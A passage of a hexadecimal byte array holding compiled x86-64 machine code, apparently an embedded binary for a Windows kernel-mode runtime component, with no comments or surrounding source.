    0x48, 0x8B, 0x6C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x8B, 0x4B, 0x18, 0xFF,
    0x15, 0x93, 0x10, 0x00, 0x00, 0x48, 0x8B, 0x4B, 0x58, 0x33, 0xFF, 0x48, 0x89, 0x7B, 0x18, 0xFF,
    0x15, 0x8B, 0x10, 0x00, 0x00, 0x48, 0x89, 0x7B, 0x58, 0x89, 0x7B, 0x50, 0x33, 0xC0, 0x48, 0x8B,
    0x5C, 0x24, 0x38, 0x48, 0x8B, 0x6C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x80, 0x7B,
    0x40, 0x00, 0x0F, 0x84, 0xD6, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4B, 0x58, 0xFF, 0x15, 0xA6, 0x11,
    0x00, 0x00, 0x48, 0x8B, 0x4B, 0x58, 0x33, 0xD2, 0xFF, 0x15, 0x2A, 0x11, 0x00, 0x00, 0x33, 0xFF,
    0x33, 0xC0, 0x48, 0x89, 0x7B, 0x58, 0x89, 0x7B, 0x50, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48, 0x8B,
    0x6C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x8B, 0x4B, 0x48, 0x33, 0xFF, 0x48,
    0x85, 0xC9, 0x74, 0x0A, 0xFF, 0x15, 0x76, 0x11, 0x00, 0x00, 0x48, 0x89, 0x7B, 0x48, 0x39, 0x7B,
    0x50, 0x8B, 0xEF, 0x0F, 0x86, 0x85, 0x00, 0x00, 0x00, 0x48, 0x89, 0x74, 0x24, 0x30, 0x48, 0x8D,
    0x73, 0x58, 0x48, 0x8B, 0x0E, 0xFF, 0x15, 0x45, 0x11, 0x00, 0x00, 0x48, 0x8B, 0x0E, 0xFF, 0x15,
    0xFC, 0x0F, 0x00, 0x00, 0x48, 0x89, 0x3E, 0x83, 0xC5, 0x01, 0x48, 0x83, 0xC6, 0x08, 0x3B, 0x6B,
    0x50, 0x72, 0xDF, 0x48, 0x8B, 0x74, 0x24, 0x30, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48,
    0x8B, 0x6C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x8B, 0x53, 0x20, 0x83, 0x7A,
    0x50, 0x00, 0x74, 0x26, 0x48, 0x8B, 0x52, 0x58, 0x48, 0x8B, 0x4B, 0x18, 0xFF, 0x15, 0xF6, 0x0F,
    0x00, 0x00, 0x33, 0xFF, 0x33, 0xC0, 0x48, 0x89, 0x7B, 0x18, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48,
    0x8B, 0x6C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x8B, 0x53, 0x10, 0x48, 0x8B,
    0x4B, 0x18, 0xFF, 0x15, 0xD0, 0x10, 0x00, 0x00, 0x33, 0xFF, 0x48, 0x89, 0x7B, 0x18, 0x33, 0xC0,
    0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48, 0x8B, 0x6C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3,
    0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48, 0x8B, 0x6C, 0x24, 0x40, 0xB8, 0xE0, 0xFF, 0xFF, 0xFF, 0x48,
    0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x66, 0x66, 0x90, 0xE6, 0x77, 0x00, 0x00, 0x86, 0x77, 0x00, 0x00,
    0x1B, 0x78, 0x00, 0x00, 0x89, 0x78, 0x00, 0x00, 0x4E, 0x78, 0x00, 0x00, 0x4E, 0x78, 0x00, 0x00,
    0x40, 0x79, 0x00, 0x00, 0xEA, 0x78, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x7C, 0x24, 0x20, 0x41, 0x54, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x81, 0xFA, 0x00, 0x00,
    0x00, 0x40, 0x48, 0x8B, 0xFA, 0x4C, 0x8B, 0xE1, 0x76, 0x11, 0xB8, 0xCA, 0xFF, 0xFF, 0xFF, 0x48,
    0x8B, 0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5C, 0xC3, 0x48, 0x89, 0x5C, 0x24, 0x40,
    0x48, 0x89, 0x6C, 0x24, 0x48, 0x41, 0xB8, 0x49, 0x50, 0x52, 0x54, 0x33, 0xC9, 0x48, 0x89, 0x74,
    0x24, 0x50, 0xBD, 0xE5, 0xFF, 0xFF, 0xFF, 0xFF, 0x15, 0xD3, 0x0F, 0x00, 0x00, 0x48, 0x85, 0xC0,
    0x48, 0x8B, 0xF0, 0x74, 0x79, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x8B, 0xD7, 0x48, 0x8B, 0xC8,
    0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x69, 0x0F, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x74, 0x4C, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0x50, 0x0F, 0x00, 0x00,
    0x8D, 0x55, 0x5B, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x0C, 0x10, 0x00, 0x00, 0x8D, 0x55, 0x1C, 0x8D,
    0x4D, 0x7B, 0x4C, 0x8B, 0xCF, 0x4C, 0x8B, 0xC6, 0xE8, 0x23, 0xEC, 0xFF, 0xFF, 0x48, 0x85, 0xC0,
    0x74, 0x13, 0xC7, 0x40, 0x50, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x58, 0x58, 0x49, 0x89, 0x04,
    0x24, 0x33, 0xC0, 0xEB, 0x1B, 0x48, 0x8B, 0xCB, 0xBD, 0xF8, 0xFF, 0xFF, 0xFF, 0xFF, 0x15, 0x7D,
    0x0E, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x4A, 0x0F, 0x00, 0x00, 0x8B, 0xC5,
    0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x74, 0x24, 0x50, 0x48,
    0x8B, 0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5C, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x6C, 0x24, 0x18, 0x56, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x81, 0xFA, 0x00, 0x00, 0x00,
    0x40, 0x48, 0x8B, 0xF2, 0x48, 0x8B, 0xE9, 0x76, 0x10, 0xB8, 0xCA, 0xFF, 0xFF, 0xFF, 0x48, 0x8B,
    0x6C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x30, 0x5E, 0xC3, 0x49, 0x8B, 0xD1, 0x48, 0x8B, 0xCE, 0x48,
    0x89, 0x7C, 0x24, 0x48, 0xFF, 0x15, 0xB6, 0x0E, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF8,
    0x75, 0x13, 0x8D, 0x47, 0xF8, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x8B, 0x6C, 0x24, 0x50, 0x48,
    0x83, 0xC4, 0x30, 0x5E, 0xC3, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x8B, 0xD6, 0x48, 0x8B, 0xC8,
    0x48, 0x89, 0x5C, 0x24, 0x40, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15,
    0x74, 0x0E, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x74, 0x57, 0x48, 0x8B, 0xC8, 0xFF,
    0x15, 0x5B, 0x0E, 0x00, 0x00, 0xBA, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x15,
    0x0F, 0x00, 0x00, 0xBA, 0x03, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xCE, 0x8D, 0x4A, 0x5D, 0x4C, 0x8B,
    0xC7, 0xE8, 0x2A, 0xEB, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x1F, 0x48, 0x8B, 0x4B, 0x30, 0xC7,
    0x40, 0x50, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x58, 0x58, 0x48, 0xC1, 0xE1, 0x0C, 0x48, 0x89,
    0x48, 0x30, 0x48, 0x89, 0x45, 0x00, 0x33, 0xC0, 0xEB, 0x17, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x7D,
    0x0D, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x6C, 0x0D, 0x00, 0x00, 0xB8, 0xF8, 0xFF, 0xFF,
    0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x8B, 0x6C, 0x24, 0x50,
    0x48, 0x83, 0xC4, 0x30, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x6C, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x30, 0x48, 0x81, 0xFA, 0x00, 0x00, 0x00,
    0x40, 0x48, 0x8B, 0xFA, 0x48, 0x8B, 0xE9, 0x76, 0x10, 0xB8, 0xCA, 0xFF, 0xFF, 0xFF, 0x48, 0x8B,
    0x6C, 0x24, 0x50, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x8B,
    0xCF, 0x48, 0x89, 0x74, 0x24, 0x48, 0xFF, 0x15, 0xB4, 0x0D, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48,
    0x8B, 0xF0, 0x75, 0x13, 0x8D, 0x46, 0xF8, 0x48, 0x8B, 0x74, 0x24, 0x48, 0x48, 0x8B, 0x6C, 0x24,
    0x50, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x8B, 0xD7, 0x48,
    0x8B, 0xC8, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0x15, 0x72, 0x0D, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x74, 0x57, 0x48, 0x8B,
    0xC8, 0xFF, 0x15, 0x59, 0x0D, 0x00, 0x00, 0xBA, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xFF,
    0x15, 0x13, 0x0E, 0x00, 0x00, 0xBA, 0x03, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xCF, 0x8D, 0x4A, 0x5D,
    0x4C, 0x8B, 0xC6, 0xE8, 0x28, 0xEA, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x1F, 0x48, 0x8B, 0x4B,
    0x30, 0xC7, 0x40, 0x50, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x58, 0x58, 0x48, 0xC1, 0xE1, 0x0C,
    0x48, 0x89, 0x48, 0x30, 0x48, 0x89, 0x45, 0x00, 0x33, 0xC0, 0xEB, 0x17, 0x48, 0x8B, 0xCB, 0xFF,
    0x15, 0x7B, 0x0C, 0x00, 0x00, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x6A, 0x0C, 0x00, 0x00, 0xB8, 0xF8,
    0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x74, 0x24, 0x48, 0x48, 0x8B, 0x6C,
    0x24, 0x50, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x48,
    0x89, 0x7C, 0x24, 0x20, 0x41, 0x54, 0x48, 0x83, 0xEC, 0x30, 0x33, 0xDB, 0x48, 0x81, 0xFA, 0x00,
    0x00, 0x02, 0x00, 0x49, 0x8B, 0xE8, 0x48, 0x8B, 0xF2, 0x4C, 0x8B, 0xE1, 0x0F, 0x83, 0xC5, 0x00,
    0x00, 0x00, 0x49, 0x8B, 0xD0, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0x7F, 0x4C, 0x3B, 0xC0, 0x4C, 0x8B, 0xCE, 0x4C, 0x8B, 0xC3, 0x48, 0x0F, 0x44,
    0xD1, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x56, 0x0D, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF8,
    0x0F, 0x84, 0x91, 0x00, 0x00, 0x00, 0x8B, 0x48, 0x28, 0x48, 0x3B, 0xCE, 0x72, 0x75, 0x48, 0x8B,
    0x48, 0x30, 0x48, 0x8B, 0xD6, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0xC1, 0xEA, 0x0C, 0x48, 0x83,
    0xC1, 0x01, 0x48, 0x3B, 0xC2, 0x73, 0x1B, 0x48, 0x39, 0x4C, 0xC7, 0x30, 0x75, 0x0F, 0x48, 0x83,
    0xC0, 0x01, 0x48, 0x83, 0xC1, 0x01, 0x48, 0x3B, 0xC2, 0x72, 0xEC, 0xEB, 0x05, 0x48, 0x3B, 0xC2,
    0x72, 0x41, 0x45, 0x33, 0xC0, 0x4C, 0x8B, 0xCE, 0x41, 0x8D, 0x50, 0x05, 0x8D, 0x4A, 0x5B, 0xE8,
    0x1C, 0xE9, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x2A, 0xC6, 0x40, 0x38, 0x01, 0x48, 0x8B, 0x4F,
    0x30, 0xC6, 0x40, 0x40, 0x01, 0x48, 0xC1, 0xE1, 0x0C, 0xC7, 0x40, 0x50, 0x01, 0x00, 0x00, 0x00,
    0x48, 0x89, 0x78, 0x58, 0x48, 0x89, 0x48, 0x30, 0x49, 0x89, 0x04, 0x24, 0x33, 0xC0, 0xE9, 0xBE,
    0x00, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0xAC, 0x0C, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B,
    0xCF, 0xFF, 0x15, 0x31, 0x0C, 0x00, 0x00, 0x48, 0x81, 0xFE, 0x00, 0x00, 0x00, 0x40, 0x76, 0x0A,
    0xBB, 0xCA, 0xFF, 0xFF, 0xFF, 0xE9, 0x95, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xD5, 0x48, 0x8B, 0xCE,
    0xFF, 0x15, 0xDA, 0x0B, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xE8, 0x74, 0x7C, 0x45, 0x33,
    0xC9, 0x45, 0x33, 0xC0, 0x8B, 0xD6, 0x48, 0x8B, 0xC8, 0x48, 0x89, 0x5C, 0x24, 0x20, 0xFF, 0x15,
    0xB4, 0x0B, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF8, 0x74, 0x55, 0x48, 0x8B, 0xC8, 0xFF,
    0x15, 0x9B, 0x0B, 0x00, 0x00, 0xBA, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x55,
    0x0C, 0x00, 0x00, 0xBA, 0x03, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xCE, 0x8D, 0x4A, 0x5D, 0x4C, 0x8B,
    0xC5, 0xE8, 0x6A, 0xE8, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x1D, 0x48, 0x8B, 0x4F, 0x30, 0xC7,
    0x40, 0x50, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0x78, 0x58, 0x48, 0xC1, 0xE1, 0x0C, 0x48, 0x89,
    0x48, 0x30, 0x49, 0x89, 0x04, 0x24, 0xEB, 0x17, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0xBF, 0x0A, 0x00,
    0x00, 0x48, 0x8B, 0xCD, 0xFF, 0x15, 0xAE, 0x0A, 0x00, 0x00, 0xBB, 0xF8, 0xFF, 0xFF, 0xFF, 0x8B,
    0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x74, 0x24, 0x50,
    0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x83, 0xC4, 0x30, 0x41, 0x5C, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48,
    0x8B, 0xFA, 0x48, 0x8B, 0xF1, 0x49, 0x8B, 0xC0, 0xB9, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0xBA, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x7F, 0x4C, 0x8B, 0xCF, 0x4C, 0x3B, 0xC1, 0x48, 0x0F, 0x44,
    0xC2, 0x45, 0x33, 0xC0, 0x33, 0xC9, 0x48, 0x8B, 0xD0, 0xFF, 0x15, 0xB1, 0x0B, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x48, 0x8B, 0xD8, 0x74, 0x57, 0x8B, 0x48, 0x28, 0x48, 0x3B, 0xCF, 0x72, 0x3B, 0x45,
    0x33, 0xC0, 0x4C, 0x8B, 0xCF, 0x41, 0x8D, 0x50, 0x06, 0x8D, 0x4A, 0x5A, 0xE8, 0xAF, 0xE7, 0xFF,
    0xFF, 0x48, 0x85, 0xC0, 0x74, 0x24, 0xC6, 0x40, 0x40, 0x01, 0xC7, 0x40, 0x50, 0x01, 0x00, 0x00,
    0x00, 0x48, 0x89, 0x58, 0x58, 0x48, 0x89, 0x06, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48,
    0x8B, 0x74, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x45,
    0x0B, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xCA, 0x0A, 0x00, 0x00, 0x48, 0x8B,
    0x5C, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x38, 0xB8, 0xF8, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4,
    0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xC2, 0x48, 0x8B, 0xDA,
    0x48, 0x8B, 0xF9, 0x48, 0x25, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x3B, 0xC2, 0x74, 0x10, 0xB8, 0xB6,
    0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0x4D, 0x8B,
    0xC8, 0x45, 0x33, 0xC0, 0x41, 0x8D, 0x50, 0x05, 0x8D, 0x4A, 0x5B, 0xE8, 0x10, 0xE7, 0xFF, 0xFF,
    0x48, 0x85, 0xC0, 0x74, 0x18, 0x48, 0x89, 0x58, 0x30, 0xC6, 0x40, 0x38, 0x00, 0x48, 0x89, 0x07,
    0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xB8, 0xF8, 0xFF,
    0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC,
    0x4C, 0x89, 0x4C, 0x24, 0x20, 0x4C, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48,
    0x89, 0x4C, 0x24, 0x08, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48,
    0x83, 0xEC, 0x60, 0x4D, 0x8B, 0xF9, 0x48, 0x8B, 0xDA, 0x48, 0xB8, 0xAB, 0xAA, 0xAA, 0xAA, 0xAA,
    0xAA, 0xAA, 0xAA, 0x49, 0xF7, 0xE0, 0x4C, 0x8B, 0xEA, 0x49, 0xC1, 0xED, 0x18, 0x4F, 0x8D, 0x54,
    0x6D, 0x00, 0x49, 0xC1, 0xE2, 0x17, 0x4D, 0x3B, 0xC2, 0x74, 0x04, 0x49, 0x83, 0xC5, 0x01, 0xB8,
    0xFF, 0xFF, 0xFF, 0xFF, 0x4C, 0x3B, 0xE8, 0x72, 0x0A, 0xB8, 0xCA, 0xFF, 0xFF, 0xFF, 0xE9, 0xDA,
    0x01, 0x00, 0x00, 0x42, 0x8D, 0x04, 0xED, 0x58, 0x00, 0x00, 0x00, 0x48, 0x63, 0xC8, 0x4D, 0x8B,
    0xC8, 0x4C, 0x8B, 0xC3, 0xBA, 0x04, 0x00, 0x00, 0x00, 0xE8, 0x62, 0xE6, 0xFF, 0xFF, 0x4C, 0x8B,
    0xE0, 0x48, 0x89, 0x44, 0x24, 0x58, 0x48, 0x85, 0xC0, 0x75, 0x0A, 0x41, 0x8D, 0x44, 0x24, 0xF8,
    0xE9, 0xA8, 0x01, 0x00, 0x00, 0x45, 0x33, 0xF6, 0x41, 0x8B, 0xF6, 0x49, 0x8B, 0xCE, 0x48, 0x89,
    0x4C, 0x24, 0x38, 0x4C, 0x8B, 0xD3, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x41, 0x8B, 0xFE, 0x44, 0x89,
    0x74, 0x24, 0x30, 0xBA, 0x00, 0x00, 0x80, 0x01, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x8B, 0xDF, 0x49, 0x3B, 0xDD, 0x0F, 0x83, 0x09, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xB0,
    0x00, 0x00, 0x00, 0x48, 0x2B, 0xC1, 0x48, 0x3B, 0xC2, 0x48, 0x0F, 0x47, 0xC2, 0x48, 0x89, 0x44,
    0x24, 0x48, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x8B, 0xD0, 0x49,
    0x8B, 0xCA, 0xFF, 0x15, 0x00, 0x09, 0x00, 0x00, 0x4C, 0x8B, 0xF8, 0x48, 0x89, 0x44, 0x24, 0x50,
    0x48, 0x85, 0xC0, 0x75, 0x0E, 0x8D, 0x70, 0xF8, 0x41, 0xBD, 0xFF, 0xFF, 0xFF, 0xFF, 0xE9, 0xDF,
    0x00, 0x00, 0x00, 0x48, 0x83, 0xBC, 0x24, 0xB8, 0x00, 0x00, 0x00, 0xFF, 0x0F, 0x95, 0xC2, 0x41,
    0xB8, 0x02, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0xA2, 0x09, 0x00, 0x00, 0x4D, 0x89,
    0x7C, 0xDC, 0x58, 0x41, 0x83, 0x44, 0x24, 0x50, 0x01, 0x4C, 0x8B, 0xBC, 0x24, 0xB8, 0x00, 0x00,
    0x00, 0x49, 0x83, 0xFF, 0xFF, 0x74, 0x31, 0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x94,
    0x24, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xA8, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x65,
    0x09, 0x00, 0x00, 0x49, 0x89, 0x44, 0x24, 0x48, 0x48, 0x85, 0xC0, 0x75, 0x0B, 0x8D, 0x70, 0xF8,
    0x41, 0xBD, 0xFF, 0xFF, 0xFF, 0xFF, 0xEB, 0x7A, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x4C,
    0x24, 0x38, 0x48, 0x03, 0xC8, 0x48, 0x89, 0x4C, 0x24, 0x38, 0x4C, 0x8B, 0x54, 0x24, 0x40, 0x4C,
    0x03, 0xD0, 0x4C, 0x89, 0x54, 0x24, 0x40, 0x83, 0xC7, 0x01, 0x89, 0x7C, 0x24, 0x30, 0xBA, 0x00,
    0x00, 0x80, 0x01, 0xE9, 0x18, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0xFF, 0x15, 0xAD,
    0x07, 0x00, 0x00, 0xBE, 0xFB, 0xFF, 0xFF, 0xFF, 0x41, 0xBD, 0xFF, 0xFF, 0xFF, 0xFF, 0x45, 0x33,
    0xF6, 0x4C, 0x8B, 0x64, 0x24, 0x58, 0x8B, 0x7C, 0x24, 0x30, 0x4C, 0x8B, 0xBC, 0x24, 0xB8, 0x00,
    0x00, 0x00, 0xEB, 0x06, 0x41, 0xBD, 0xFF, 0xFF, 0xFF, 0xFF, 0x85, 0xF6, 0x78, 0x14, 0x4D, 0x89,
    0x7C, 0x24, 0x30, 0x48, 0x8B, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x4C, 0x89, 0x20, 0x8B, 0xC6,
    0xEB, 0x4B, 0x48, 0x63, 0xC7, 0x85, 0xFF, 0x74, 0x25, 0x49, 0x8D, 0x5C, 0xC4, 0x58, 0x66, 0x90,
    0x48, 0x83, 0xEB, 0x08, 0x48, 0x8B, 0x0B, 0xFF, 0x15, 0x93, 0x08, 0x00, 0x00, 0x48, 0x8B, 0x0B,
    0xFF, 0x15, 0x4A, 0x07, 0x00, 0x00, 0x4C, 0x89, 0x33, 0x41, 0x03, 0xFD, 0x75, 0xE2, 0x49, 0x8B,
    0x4C, 0x24, 0x48, 0x48, 0x85, 0xC9, 0x74, 0x0B, 0xFF, 0x15, 0x82, 0x08, 0x00, 0x00, 0x4D, 0x89,
    0x74, 0x24, 0x48, 0x49, 0x8B, 0xCC, 0xE8, 0x15, 0xE5, 0xFF, 0xFF, 0x8B, 0xC6, 0x48, 0x83, 0xC4,
    0x60, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57,
    0x48, 0x83, 0xEC, 0x20, 0x49, 0x8B, 0xD9, 0x49, 0x8B, 0xF8, 0x48, 0x8B, 0xF2, 0x48, 0x8B, 0xE9,
    0xE8, 0x3B, 0xD3, 0xFF, 0xFF, 0x48, 0x3B, 0xD8, 0x74, 0x07, 0xB8, 0xDB, 0xFF, 0xFF, 0xFF, 0xEB,
    0x11, 0x4C, 0x8B, 0xCB, 0x4C, 0x8B, 0xC7, 0x48, 0x8B, 0xD6, 0x48, 0x8B, 0xCD, 0xE8, 0x6E, 0xFD,
    0xFF, 0xFF, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48, 0x8B, 0x74, 0x24,
    0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x49, 0x83, 0xC9, 0xFF, 0xE9, 0x47, 0xFD, 0xFF, 0xFF, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xB8, 0xF4, 0xFF, 0xFF, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xB8, 0xF4, 0xFF, 0xFF, 0xFF, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7C, 0x24, 0x18, 0x4C,
    0x89, 0x64, 0x24, 0x20, 0x41, 0x55, 0x48, 0x83, 0xEC, 0x40, 0x48, 0x8B, 0xFA, 0x4C, 0x8B, 0xE1,
    0xBB, 0xB5, 0xFF, 0xFF, 0xFF, 0x8B, 0x42, 0x50, 0x85, 0xC0, 0x0F, 0x84, 0xBE, 0x00, 0x00, 0x00,
    0x83, 0xF8, 0x01, 0x74, 0x08, 0x8D, 0x43, 0x26, 0xE9, 0x2C, 0x01, 0x00, 0x00, 0x4D, 0x85, 0xC0,
    0x75, 0x09, 0x41, 0x8D, 0x40, 0xDB, 0xE9, 0x1E, 0x01, 0x00, 0x00, 0x83, 0x7A, 0x24, 0x00, 0x74,
    0x13, 0x48, 0x8B, 0x74, 0x24, 0x78, 0x48, 0x83, 0xFE, 0xFF, 0x75, 0x0D, 0x8D, 0x46, 0xDC, 0xE9,
